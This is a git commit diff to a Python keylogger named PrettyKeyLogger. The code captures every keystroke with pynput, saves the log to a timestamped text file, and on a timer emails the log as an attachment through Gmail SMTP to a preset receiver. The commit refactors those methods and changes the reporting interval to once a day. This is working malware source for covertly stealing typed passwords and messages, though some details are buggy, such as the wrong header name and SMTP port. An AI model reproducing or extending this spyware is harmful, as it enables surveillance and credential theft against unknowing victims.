5ee60de2e2d3fda99b64e3f98a059fae7d762083
miggyG <54223177+miggyG@users.noreply.github.com>
2022-03-30 09:39:19 -0600

    Update PrettyKeyLogger.py

--- src/PrettyKeyLogger.py
+++ src/PrettyKeyLogger.py
@@ -5,7 +5,7 @@
 # getting keystrokes
 from pynput import keyboard
 
-#for emailing
+# for emailing
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -31,7 +31,6 @@ class KeyLogger:
         self.log = ""
         # records date and time of starting and ending
         self.startDate = datetime.now()
-        self.endDate = datetime.now()
         self.filename = ""
         self.start()
 
@@ -46,7 +45,7 @@ class KeyLogger:
                 name = "[ENTER]\n"
             elif name == "Key.backspace":
                 name = "[Del]"
-                self.log = self.log[:-1]
+                # self.log = self.log[:-1]
         name = name.replace("Key.", "")
         name = name.replace("\'", "")
         print(name)  # testing purposes
@@ -54,56 +53,52 @@ class KeyLogger:
         print(self.log)  # testing purposes
 
     def naming(self):
-        self.endDate = datetime.now()
-        startdatestr = str(self.startDate).replace(" ", "-").replace(":", "")
-        enddatestr = str(self.endDate).replace(" ", "-").replace(":", "")
-        self.filename = "keylog-"+str(startdatestr)+"-"+str(enddatestr)
+        startdatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = "keylog-"+str(startdatestr)
 
-    def filehandler(self):
-        print(self.filename)
-        # try and finally block so that the file closes safely
-        f = open(str(self.filename) + ".txt", 'w')
-        f.write(self.log)
-        f.close()
+    def carrierpidgeon(self, email, password, reciver, logstr, subject):
+        # subject will act as the subject and file name to keep code more simple
+        # for attaching files
+        # setting up MIMEMultipart
+        # (https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python)
 
-    def carrierPidgeon(self, email, password, reciver, logstr, subject):
-            # subject will act as the subject and file name to keep code more simple
-            # for attatching files
-            # setting up MIMEMultipart (https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python)
+        mime = MIMEMultipart()
+        mime['From'] = email
+        mime['To'] = reciver
+        mime['Subject'] = subject
+        # body and attachments
+        mime.attach(MIMEText(logstr, 'plain'))
+        attach_file = open(subject + ".txt", 'rb')
 
-            mime = MIMEMultipart()
-            mime['From'] = email
-            mime['To'] = reciver
-            mime['Subject'] = subject
-            # body and attatchments
-            mime.attach(MIMEText(logstr, 'plain'))
-            attach_file_name = subject
-            attach_file = open(attach_file_name, 'rb')
+        payload = MIMEBase('application', 'octate-stream')
+        payload.set_payload(attach_file.read())
+        encoders.encode_base64(payload)  # encodes attatchment
+        # add header with filename
+        payload.add_header('Content-Decomposition', 'attachment', filename=subject)
+        mime.attach(payload)
 
-            payload = MIMEBase('application', 'octate-stream')
-            payload.set_payload((attach_file).read())
-            encoders.encode_base64(payload)  # encodes attatchment
-            # add header with filename
-            payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
-            mime.attach(payload)
-
-            # connect to mail server
-            server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
-            server.starttls()
-            # logging in
-            server.login(email, password)
-            text = mime.as_string()
-            server.sendmail(email, reciver, text)
-            server.quit()
+        # connect to mail server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
+        server.starttls()
+        # logging in
+        server.login(email, password)
+        text = mime.as_string()
+        server.sendmail(email, reciver, text)
+        server.quit()
 
     def report(self):
+        f = open(str(self.filename) + ".txt", 'w')
+        self.naming()
         if self.log:
-            self.endDate = datetime.now()
-            self.filehandler()
-            # emailing
-            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVE, self.log, self.filename)
-            self.log = ""
-            self.startDate = datetime.now()
+            try:
+                f.write(self.log)
+                f.close()
+            finally:
+                try:
+                    self.carrierpidgeon(EMAIL, EMAILPASS, EMAILRECIVE, self.log, self.filename)
+                finally:
+                    self.log = ""
+                    self.startDate = datetime.now()
 
         timer = Timer(interval=self.interval, function=self.report)
         # start the timer
@@ -118,4 +113,4 @@ class KeyLogger:
 
 if __name__ == "__main__":
     # make interval SECINDAY after done testing
-    k = KeyLogger(interval=60)
+    k = KeyLogger(interval=SECINDAY)
